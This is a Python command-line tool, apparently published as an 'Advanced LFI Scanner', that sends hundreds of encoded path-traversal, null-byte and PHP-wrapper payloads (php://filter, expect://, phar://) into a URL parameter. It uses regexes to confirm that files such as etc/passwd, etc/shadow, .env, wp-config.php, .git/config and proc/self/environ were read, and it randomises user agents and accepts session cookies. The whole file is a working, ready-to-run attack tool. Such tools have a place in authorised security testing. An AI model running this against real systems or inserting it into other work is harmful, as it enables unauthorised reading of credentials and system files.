#!/usr/bin/python3
import re
import argparse
import sys
import requests
import time
import urllib.parse
import random
import json
from http.cookies import SimpleCookie
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Set, Optional
from dataclasses import dataclass, field

befvar = (
    "",
    "./",
    "/",
    "\\",  
    "",
    ".\\",
    "file:",
    "file:/",
    "file://",
    "file:///",
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.rot13/resource=",
    "php://filter/zlib.deflate/convert.base64-encode/resource=",
    "expect://",
    "data://text/plain,",
    "data://text/plain;base64,",
    "zip://",
    "phar://",
)

dotvar = (
    "",
    "/..",
    "....//",
    "//....",
    "%252e%252e%255c",
    "%2e%2e%5c",
    "..%255c",
    "..%5c",
    "%5c../",
    "/%5c..",
    "..\\",
    "%2e%2e%2f",
    "../",
    "..%2f",
    "%2e%2e/",
    "%2e%2e%2f",
    "..%252f",
    "%252e%252e/",
    "%252e%252e%252f",
    "..%5c..%5c",
    "%2e%2e\\",
    "%2e%2e%5c",
    "%252e%252e\\",
    "%252e%252e%255c",
    "..%c0%af",
    "%c0%ae%c0%ae/",
    "%c0%ae%c0%ae%c0%af",
    "..%25c0%25af",
    "%25c0%25ae%25c0%25ae/",
    "%25c0%25ae%25c0%25ae%25c0%25af",
    "..%c1%9c",
    "%c0%ae%c0%ae\\",
    "%c0%ae%c0%ae%c1%9c",
    "..%25c1%259c",
    "%25c0%25ae%25c0%25ae\\",
    "%25c0%25ae%25c0%25ae%25c1%259c",
    "..%%32%66",
    "%%32%65%%32%65/",
    "%%32%65%%32%65%%32%66",
    "..%%35%63",
    "%%32%65%%32%65/",
    "%%32%65%%32%65%%35%63",
    "../",
    "...\\",
    "..../",
    "....\\",
    "........................................................................../",
    "..........................................................................\\",
    "..%u2215",
    "%uff0e%uff0e%u2215",
    "..%u2216",
    "..%uEFC8",
    "..%uF025",
    "%uff0e%uff0e\\",
    "%uff0e%uff0e%u2216",
    "..;/",
    "..\x00/",
    "..%00/",
    "..%0d%0a/",
    "../%0d%0a",
    ".%00.",
    "%00../",
    "...%00/",
)

match = {
    "c:\\boot.ini": "boot\W*loader",
    "c:\\windows\\system32\\drivers\\etc\\hosts": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t]+[a-zA-Z0-9-_.]*",
    "c:\\windows\\win.ini": "\[fonts\]|\[extensions\]|\[files\]",
    "c:\\windows\\system.ini": "\[boot\]|\[drivers\]|\[keyboard\]",
    "etc/hosts": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t][a-zA-Z0-9-_.]*",
    "etc/passwd": "\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]+:[\/a-zA-Z0-9]*",
    "etc/shadow": "\w*\:\$[0-9]\$[a-zA-Z0-9\/\.]*\:",
    "etc/group": "\w*\:\w\:[0-9]*\:",
    "etc/issue": "Ubuntu|Debian|CentOS|Red Hat|Fedora|SUSE",
    "etc/motd": "Welcome|Linux|Unix",
    "etc/resolv.conf": "nameserver|domain|search",
    "etc/mysql/my.cnf": "\[mysqld\]|\[client\]|port|socket",
    "etc/apache2/apache2.conf": "ServerRoot|DocumentRoot|ErrorLog|CustomLog",
    "etc/nginx/nginx.conf": "server\s*\{|location|root|index",
    "var/log/apache2/access.log": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*HTTP",
    "var/log/apache2/error.log": "\[error\]|\[warn\]|\[notice\]",
    "var/log/nginx/access.log": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*HTTP",
    "var/log/nginx/error.log": "\[error\]|\[warn\]|\[crit\]",
    "proc/self/environ": "PATH=|HOME=|USER=",
    "proc/self/cmdline": "[a-zA-Z0-9/\-_]+",
    "proc/version": "Linux version|gcc version",
    "proc/cpuinfo": "processor|vendor_id|cpu family",
    ".htaccess": "AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile",
    ".htpasswd": "[a-zA-Z0-9_-]+:\$apr1\$|[a-zA-Z0-9_-]+:\{SHA\}",
    "login.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
    "index.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
    "config.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
    "database.php": "mysql_connect|mysqli_connect|PDO|database|username|password",
    "wp-config.php": "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST",
    ".env": "APP_KEY|DB_PASSWORD|API_KEY|SECRET",
    ".git/config": "\[core\]|\[remote",
    ".git/HEAD": "ref: refs/heads",
    ".svn/entries": "svn|dir|file",
    "composer.json": "\"name\"|\"require\"|\"autoload\"",
    "package.json": "\"name\"|\"version\"|\"dependencies\"",
}

null_bytes = (
    "%00",
    "\x00",
    "\\0",
    "%2500",
    "%%00",
)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CYAN = '\033[96m'
    MAGENTA = '\033[35m'

@dataclass
class ScanResult:
    url: str
    status_code: int
    matched: bool
    pattern: str
    file_target: str
    matched_data: List[str] = field(default_factory=list)
    response_time: float = 0.0
    content_length: int = 0

class AdvancedLFIScanner:
    def __init__(self, url: str, string: str, cookie: Optional[str] = None, 
                 depth: int = 6, verbose: bool = False, threads: int = 10,
                 timeout: int = 10, user_agent: Optional[str] = None,
                 delay: float = 0.0, output_file: Optional[str] = None,
                 null_byte: bool = False, follow_redirects: bool = False):
        self.url = url
        self.string = string
        self.cookie = cookie
        self.depth = depth
        self.verbose = verbose
        self.threads = threads
        self.timeout = timeout
        self.user_agent = user_agent or self._get_random_user_agent()
        self.delay = delay
        self.output_file = output_file
        self.null_byte = null_byte
        self.follow_redirects = follow_redirects
        self.visited_urls: Set[str] = set()
        self.results: List[ScanResult] = []
        self.total_requests = 0
        self.successful_findings = 0
        self.session = requests.Session()
        
    def _get_random_user_agent(self) -> str:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        ]
        return random.choice(user_agents)
    
    def discover(self):
        print(f"{Colors.BOLD}🚀 Initiating Advanced LFI Vulnerability Scan 🚀{Colors.ENDC}\n")
        
        payloads = self._generate_payloads()
        print(f"{Colors.CYAN}Total payloads generated: {len(payloads)}{Colors.ENDC}")
        print(f"{Colors.CYAN}Thread pool size: {self.threads}{Colors.ENDC}\n")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._test_payload, payload): payload 
                      for payload in payloads}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)
                    if result.matched:
                        self.successful_findings += 1
                        self._print_finding(result)
                    elif self.verbose:
                        self._print_verbose(result)
                
                if self.delay > 0:
                    time.sleep(self.delay)
        
        end_time = time.time()
        self._print_summary(end_time - start_time)
        
        if self.output_file:
            self._save_results()
    
    def _generate_payloads(self) -> List[Tuple[str, str, str, str]]:
        payloads = []
        
        for depth in range(self.depth + 1):
            for var in dotvar:
                for bvar in befvar:
                    for word, pattern in match.items():
                        traversal = var * depth
                        full_path = bvar + traversal + word
                        
                        if self.null_byte:
                            for nb in null_bytes:
                                payloads.append((full_path + nb, word, pattern, f"{bvar}+{var}*{depth}+nullbyte"))
                        
                        payloads.append((full_path, word, pattern, f"{bvar}+{var}*{depth}"))
        
        return payloads
    
    def _test_payload(self, payload_info: Tuple[str, str, str, str]) -> Optional[ScanResult]:
        payload, file_target, pattern, technique = payload_info
        
        new_url = re.sub(re.escape(self.string), payload, self.url)
        
        if new_url in self.visited_urls:
            return None
        
        self.visited_urls.add(new_url)
        self.total_requests += 1
        
        try:
            start_req = time.time()
            response = self._make_request(new_url)
            response_time = time.time() - start_req
            
            matched_data = re.findall(pattern, response.text, re.IGNORECASE)
            
            result = ScanResult(
                url=new_url,
                status_code=response.status_code,
                matched=bool(matched_data),
                pattern=pattern,
                file_target=file_target,
                matched_data=matched_data[:10],
                response_time=response_time,
                content_length=len(response.content)
            )
            
            return result
            
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} {new_url}: {str(e)}")
            return None
    
    def _make_request(self, url: str) -> requests.Response:
        headers = {
            'User-Agent': self.user_agent,
        }
        
        if self.cookie:
            headers['Cookie'] = self.cookie
        
        response = self.session.get(
            url,
            headers=headers,
            timeout=self.timeout,
            allow_redirects=self.follow_redirects,
            verify=False
        )
        
        return response
    
    def _print_finding(self, result: ScanResult):
        status_color = self._colorize_status(result.status_code)
        print(f"\n{Colors.BOLD}{Colors.OKGREEN}[VULNERABILITY FOUND]{Colors.ENDC}")
        print(f"{status_color}[{result.status_code}]{Colors.ENDC} {result.url}")
        print(f"{Colors.CYAN}Target File:{Colors.ENDC} {result.file_target}")
        print(f"{Colors.CYAN}Matches Found:{Colors.ENDC} {len(result.matched_data)}")
        print(f"{Colors.CYAN}Response Time:{Colors.ENDC} {result.response_time:.2f}s")
        print(f"{Colors.CYAN}Content Length:{Colors.ENDC} {result.content_length} bytes")
        
        if self.verbose and result.matched_data:
            print(f"{Colors.MAGENTA}Sample Matches:{Colors.ENDC}")
            for i, data in enumerate(result.matched_data[:5]):
                print(f"  {i+1}. {data[:100]}")
    
    def _print_verbose(self, result: ScanResult):
        status_color = self._colorize_status(result.status_code)
        print(f"{status_color}[{result.status_code}]{Colors.ENDC} {result.url} ({result.response_time:.2f}s)")
    
    def _colorize_status(self, code: int) -> str:
        color_map = {
            '2': Colors.OKGREEN,
            '3': Colors.WARNING,
            '4': Colors.FAIL,
            '5': Colors.OKBLUE
        }
        color_code = str(code)[0]
        return color_map.get(color_code, Colors.ENDC)
    
    def _print_summary(self, elapsed_time: float):
        print(f"\n{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}SCAN SUMMARY{Colors.ENDC}")
        print(f"{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"{Colors.CYAN}Total Requests:{Colors.ENDC} {self.total_requests}")
        print(f"{Colors.CYAN}Unique URLs Tested:{Colors.ENDC} {len(self.visited_urls)}")
        print(f"{Colors.OKGREEN}Vulnerabilities Found:{Colors.ENDC} {self.successful_findings}")
        print(f"{Colors.CYAN}Elapsed Time:{Colors.ENDC} {elapsed_time:.2f}s")
        print(f"{Colors.CYAN}Requests/Second:{Colors.ENDC} {self.total_requests/elapsed_time:.2f}")
        print(f"{Colors.BOLD}{'='*70}{Colors.ENDC}\n")
    
    def _save_results(self):
        try:
            output_data = {
                "scan_info": {
                    "target_url": self.url,
                    "target_param": self.string,
                    "depth": self.depth,
                    "total_requests": self.total_requests,
                    "vulnerabilities_found": self.successful_findings,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                },
                "findings": [
                    {
                        "url": r.url,
                        "status_code": r.status_code,
                        "file_target": r.file_target,
                        "matches": len(r.matched_data),
                        "response_time": r.response_time,
                        "content_length": r.content_length
                    }
                    for r in self.results if r.matched
                ]
            }
            
            with open(self.output_file, 'w') as f:
                json.dump(output_data, f, indent=2)
            
            print(f"{Colors.OKGREEN}Results saved to: {self.output_file}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}Error saving results: {str(e)}{Colors.ENDC}")

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description='Advanced LFI Scanner - Comprehensive Local File Inclusion Detection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -u "http://target.com/page.php?file=document.pdf" -s "document.pdf"
  %(prog)s -u "http://target.com/?page=home" -s "home" -d 8 -t 20 -v
  %(prog)s -u "http://target.com/view?doc=file.txt" -s "file.txt" -c "session=abc123" -o results.json
        '''
    )
    
    parser.add_argument('--url', '-u', action='store', dest='url', required=True,
                       help='Target URL with parameter to test')
    parser.add_argument('--string', '-s', action='store', dest='string', required=True,
                       help='String to replace in URL (e.g., document.pdf)')
    parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False,
                       help='Session cookie for authenticated testing')
    parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, 
                       type=int, default=6, help='Directory traversal depth (default: 6)')
    parser.add_argument('--threads', '-t', action='store', dest='threads', required=False,
                       type=int, default=10, help='Number of concurrent threads (default: 10)')
    parser.add_argument('--timeout', action='store', dest='timeout', required=False,
                       type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--user-agent', action='store', dest='user_agent', required=False,
                       help='Custom User-Agent string')
    parser.add_argument('--delay', action='store', dest='delay', required=False,
                       type=float, default=0.0, help='Delay between requests in seconds')
    parser.add_argument('--output', '-o', action='store', dest='output', required=False,
                       help='Output file for results (JSON format)')
    parser.add_argument('--null-byte', '-n', action='store_true', required=False,
                       help='Enable null byte injection tests')
    parser.add_argument('--follow-redirects', '-r', action='store_true', required=False,
                       help='Follow HTTP redirects')
    parser.add_argument('--verbose', '-v', action='store_true', required=False,
                       help='Enable verbose output mode')
    
    return parser.parse_args()

def print_banner(url: str):
    banner = f"""
    {Colors.BOLD}{Colors.OKBLUE}
    ╔═══════════════════════════════════════════════════════════╗
    ║                     LFI mini Scanner                      ║
    ╚═══════════════════════════════════════════════════════════╝
    {Colors.ENDC}
    """
    print(banner)
    print(f"{Colors.CYAN}Version:{Colors.ENDC} {Colors.OKGREEN}2.0.0{Colors.ENDC}")
    print(f"{Colors.CYAN}Author:{Colors.ENDC} {Colors.OKGREEN}@Zierax{Colors.ENDC}")
    print(f"{Colors.CYAN}Target:{Colors.ENDC} {Colors.OKBLUE}{url}{Colors.ENDC}")
    print(f"{Colors.CYAN}Timestamp:{Colors.ENDC} {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    

def main():
    try:
        args = parse_arguments()
        
        print_banner(args.url)
        
        scanner = AdvancedLFIScanner(
            url=args.url,
            string=args.string,
            cookie=args.cookie,
            depth=args.depth,
            verbose=args.verbose,
            threads=args.threads,
            timeout=args.timeout,
            user_agent=args.user_agent,
            delay=args.delay,
            output_file=args.output,
            null_byte=args.null_byte,
            follow_redirects=args.follow_redirects
        )
        
        scanner.discover()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Scan interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.FAIL}Fatal error: {str(e)}{Colors.ENDC}")
        sys.exit(1)

if __name__ == '__main__':
    main()
